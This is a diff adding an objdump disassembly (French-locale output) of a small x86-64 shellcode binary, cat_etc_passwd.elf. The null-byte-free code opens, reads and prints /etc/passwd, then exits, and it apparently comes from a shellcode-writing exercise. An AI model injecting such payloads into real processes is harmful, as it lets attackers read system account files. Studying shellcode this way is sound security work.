@@ -1,0 +1,37 @@
+
+cat_etc_passwd.elf:     format de fichier elf64-x86-64
+
+
+Déassemblage de la section .text :
+
+0000000000401000 <.text>:
+  401000:	48 31 c0             	xor    rax,rax
+  401003:	50                   	push   rax
+  401004:	b0 02                	mov    al,0x2
+  401006:	49 b9 2f 2f 70 61 73 	movabs r9,0x6477737361702f2f
+  40100d:	73 77 64 
+  401010:	49 b8 2f 65 74 63 2f 	movabs r8,0x2f2f2f2f6374652f
+  401017:	2f 2f 2f 
+  40101a:	41 51                	push   r9
+  40101c:	41 50                	push   r8
+  40101e:	48 89 e7             	mov    rdi,rsp
+  401021:	48 31 f6             	xor    rsi,rsi
+  401024:	48 31 d2             	xor    rdx,rdx
+  401027:	0f 05                	syscall 
+  401029:	48 97                	xchg   rdi,rax
+  40102b:	48 31 c0             	xor    rax,rax
+  40102e:	b0 00                	mov    al,0x0
+  401030:	48 8d 34 24          	lea    rsi,[rsp]
+  401034:	48 31 d2             	xor    rdx,rdx
+  401037:	66 83 c2 ff          	add    dx,0xffff
+  40103b:	0f 05                	syscall 
+  40103d:	48 92                	xchg   rdx,rax
+  40103f:	48 31 c0             	xor    rax,rax
+  401042:	b0 01                	mov    al,0x1
+  401044:	48 31 ff             	xor    rdi,rdi
+  401047:	48 ff c7             	inc    rdi
+  40104a:	0f 05                	syscall 
+  40104c:	48 31 c0             	xor    rax,rax
+  40104f:	b0 3c                	mov    al,0x3c
+  401051:	48 31 ff             	xor    rdi,rdi
+  401054:	0f 05                	syscall 
